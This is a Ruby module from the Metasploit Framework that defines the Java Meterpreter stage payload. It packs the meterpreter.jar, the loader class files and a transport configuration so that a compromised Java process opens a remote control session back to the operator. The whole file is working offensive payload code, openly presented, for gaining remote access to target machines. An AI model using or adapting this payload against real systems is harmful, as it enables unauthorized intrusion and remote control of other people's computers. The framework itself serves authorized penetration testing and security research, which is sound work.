##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'msf/core/payload/java'
require 'msf/core/handler/reverse_tcp'
require 'msf/base/sessions/meterpreter_java'
require 'msf/base/sessions/meterpreter_options'


module MetasploitModule

  include Msf::Sessions::MeterpreterOptions

  # The stager should have already included this
  #include Msf::Payload::Java

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Java Meterpreter',
      'Description'    => 'Run a meterpreter server in Java',
      'Author'         => ['mihi', 'egypt', 'OJ Reeves'],
      'Platform'       => 'java',
      'Arch'           => ARCH_JAVA,
      'PayloadCompat'  => {
          'Convention' => 'javasocket javaurl',
        },
      'License'        => MSF_LICENSE,
      'Session'        => Msf::Sessions::Meterpreter_Java_Java
    ))

    # Order matters.  Classes can only reference classes that have already
    # been sent.  The last .class must implement Stage, i.e. have a start()
    # method.
    #
    # The Meterpreter.class stage is just a jar loader, not really anything
    # to do with meterpreter specifically.  This payload should eventually
    # be replaced with an actual meterpreter stage so we don't have to send
    # a second jar.
    @stage_class_files = [
      [ "javapayload", "stage", "Stage.class" ],
      [ "com", "metasploit", "meterpreter", "MemoryBufferURLConnection.class" ],
      [ "com", "metasploit", "meterpreter", "MemoryBufferURLStreamHandler.class" ],
      # Must be last!
      [ "javapayload", "stage", "Meterpreter.class" ],
    ]
  end

  #
  # Override the Payload::Java version so we can load a prebuilt jar to be
  # used as the final stage; calls super to get the intermediate stager.
  #
  def generate_stage(opts={})
    met = MetasploitPayloads.read('meterpreter', 'meterpreter.jar')
    config = generate_config(opts)

    # All of the dependencies to create a jar loader, followed by the length
    # of the jar and the jar itself, then the config
    blocks = [
      super(opts),
      [met.length, met].pack('NA*'),
      [config.length, config].pack('NA*')
    ]

    # Deliberate off by 1 here. The call to super adds a null terminator
    # so we would add 1 for the null terminate and remove one for the call
    # to super.
    block_count = blocks.length + @stage_class_files.length

    # Pack all the magic together
    (blocks + [block_count]).pack('A*' * blocks.length + 'N')
  end

  def generate_config(opts={})
    opts[:uuid] ||= generate_payload_uuid

    # create the configuration block, which for staged connections is really simple.
    config_opts = {
      ascii_str:  true,
      arch:       opts[:uuid].arch,
      expiration: datastore['SessionExpirationTimeout'].to_i,
      uuid:       opts[:uuid],
      transports: [transport_config(opts)]
    }

    # create the configuration instance based off the parameters
    config = Rex::Payloads::Meterpreter::Config.new(config_opts)

    # return the XML version of it
    config.to_b
  end
end
